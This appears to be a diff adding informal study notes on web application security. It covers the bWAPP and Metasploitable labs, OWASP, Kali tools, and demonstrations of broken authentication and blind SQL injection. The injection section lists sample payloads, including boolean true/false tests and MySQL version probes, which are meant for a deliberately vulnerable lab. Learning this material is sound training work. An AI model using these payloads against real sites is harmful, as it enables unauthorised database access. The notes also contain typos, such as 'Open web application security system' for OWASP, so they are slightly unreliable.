@@ -1826,6 +1826,89 @@ BWAPP and Metasploitable features
 - Local PHP setting file.
 - No - authentication mode ( A.I.M.)
 - 'Evil Bee' mode, bypassing security checks.
-- 'Evil' directory, including attack 
+- 'Evil' directory, including attack scripts.
+- WSDL file (web services/SOAP)
+- Fuzzing possibilities
+
+------------------------------------------------
+
+Ethical Hackers learn bWAPP & Metasploit able 
+- It has over 70 web bugs!
+- covering all major known web vulnerabilities.
+- Including all risk from the OWASP Top 10 project. 
+
+
+-------------------------------------------------
+OWASP
+Open web application  security system
+
+world wide non profit organization focused on 
+improving the security of software.
+- freely - available articles, methodologies,
+documentation, tools and technologies.
+- vendor neutral, no recommendations for commercial products or services. 
+---------------------------------------------------------
+
+KALI --
+
+- Burp Suite
+- DirBuster
+- Metasploit
+- Nikto
+- W3af 
+- Web Sploit
+- ZAP
+- Nmap
+- Wireshark
+
+------------------------------------------------------------
+Demonstration - Web application attack : Broken Authentication
+download link owasp os in vmware in zip- 
+https://sourceforge.net/projects/owaspbwa/
+----------------------------
+===============================================
+Demonstration 
+Web Application Attack
+- Broken authentication - Login forms
+a. happy cycle
+b. see URL, cookies, Errors and Console-storage-cookies.
+c. see page source
+            scripts
+            other pages 
+            input tags             
+- in mitigation - prereview (code) process and quality check process 
+before going to productions 
+- tool can use for code analyzer - Micro Focus Frtify 
+(fortify application for security testing )
+
+===================================================
+-Blind SQL Injection
+4
+- try special characters  -      ' " } ) -- ##
+select * form movies where_name="Batman"
+if we using 
+select * form movies where_name=' ' OR ' 1 '  = '1'    
+not working or make sense here because we search here.  
+----
+select * form movies where_name='Iron man'  
+select * form movies where_name='Iron man' AND 1=1#'
+TRUE :  'Iron man' AND 1=1#'
+FALSE : 'Iron man' AND 1=2#'
+
+5
+Figure out the version of MySQL
+select * form movies where_name='Iron man'  AND substring(version(), start,number of string)=4#'
+
+select * form movies where_name='Iron man'  AND substring(version(), 1,1)=4#'
+'Iron man'  AND substring(version(), 1,1)=4#'
+or
+'Iron man'  AND substring(version(), 1,1)=5#'
+
+
+
+
+===================================================
+- Cross Site Scripting 
+
 
 
